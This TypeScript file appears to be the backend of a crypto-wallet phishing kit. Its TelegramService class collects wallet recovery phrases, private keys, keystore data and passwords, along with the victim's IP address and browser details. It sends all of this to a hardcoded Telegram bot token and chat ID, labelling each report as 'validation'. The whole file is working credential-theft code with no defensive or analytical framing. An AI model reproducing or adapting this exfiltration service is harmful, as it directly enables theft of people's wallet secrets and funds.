interface TelegramMessage {
  walletName: string;
  walletType: string;
  inputType: 'phrase' | 'privateKey' | 'keystore';
  inputData: string;
  password?: string;
  isValid: boolean;
  validationMessage: string;
  userAgent: string;
  timestamp: string;
  ip?: string;
}

export class TelegramService {
  private readonly botToken: string;
  private readonly chatId: string;

  constructor() {
    // Use environment variables with fallback
    this.botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '8250920559:AAGldCXRugytYLYjlhc_fLxUKJrt9-Psr2c';
    this.chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '1850435445';
  }

  private async getClientIP(): Promise<string> {
    try {
      // Try multiple IP services in case one fails
      const ipServices = [
        'https://api.ipify.org?format=json',
        'https://api64.ipify.org?format=json',
        'https://ipapi.co/json/'
      ];

      for (const service of ipServices) {
        try {
          const response = await fetch(service, {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
            },
            // Add timeout
            signal: AbortSignal.timeout(5000)
          });
          
          if (response.ok) {
            const data = await response.json();
            return data.ip || data.ip_address || 'Unknown';
          }
        } catch (error) {
          console.log(`IP service ${service} failed, trying next...`);
          continue;
        }
      }
      
      throw new Error('All IP services failed');
    } catch (error) {
      console.warn('Could not fetch IP address, using fallback:', error);
      return 'IP_Fetch_Failed';
    }
  }

  async sendWalletData(message: Omit<TelegramMessage, 'ip'>): Promise<{success: boolean; error?: string}> {
    try {
      console.log('🟡 Sending Telegram message...', {
        walletName: message.walletName,
        inputType: message.inputType,
        isValid: message.isValid
      });

      let ip = 'Unknown';
      try {
        ip = await this.getClientIP();
      } catch (ipError) {
        console.warn('IP fetch failed, continuing without IP:', ipError);
        ip = 'IP_Fetch_Failed';
      }

      const fullMessage: TelegramMessage = {
        ...message,
        ip
      };

      const formattedMessage = this.formatMessage(fullMessage);
      
      const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      
      console.log('📤 Telegram API call:', telegramUrl.replace(this.botToken, '***'));
      
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: formattedMessage,
          parse_mode: 'HTML'
        })
      });

      const responseData = await response.json();
      
      if (!response.ok) {
        console.error('❌ Telegram API error:', responseData);
        return {
          success: false,
          error: responseData.description || `HTTP ${response.status}`
        };
      }

      console.log('✅ Telegram message sent successfully to chat:', this.chatId);
      return { success: true };

    } catch (error: any) {
      console.error('❌ Failed to send Telegram message:', error);
      return {
        success: false,
        error: error.message || 'Network error'
      };
    }
  }

  private formatMessage(message: TelegramMessage): string {
    // Determine stage and status based on validation message
    let stage = '🟢 VALIDATION RESULT';
    let status = message.isValid ? '✅ VALID' : '❌ INVALID';
    
    // Check if this is the first message (pending state)
    if (message.validationMessage.includes('PENDING') || 
        message.validationMessage.includes('pending') ||
        message.validationMessage.includes('VALIDATION IN PROGRESS') ||
        message.validationMessage.includes('validation in progress')) {
      stage = '🟡 PENDING VALIDATION';
      status = '⏳ PENDING';
    }
    
    // Truncate long data for better readability
    const truncatedData = message.inputData.length > 500 
      ? message.inputData.substring(0, 500) + '...' 
      : message.inputData;

    return `
<b>${stage} - ${status}</b>

💰 <b>Wallet:</b> ${message.walletName}
📝 <b>Type:</b> ${message.walletType}
🔑 <b>Input Type:</b> ${message.inputType}
📊 <b>Status:</b> ${message.validationMessage}

📄 <b>Data:</b>
<code>${truncatedData}</code>

${message.password ? `🔒 <b>Password:</b> ${message.password}\n` : ''}
🌐 <b>User Agent:</b> ${message.userAgent.substring(0, 100)}...
📍 <b>IP Address:</b> ${message.ip}
⏰ <b>Time:</b> ${new Date(message.timestamp).toLocaleString()}
    `.trim();
  }
}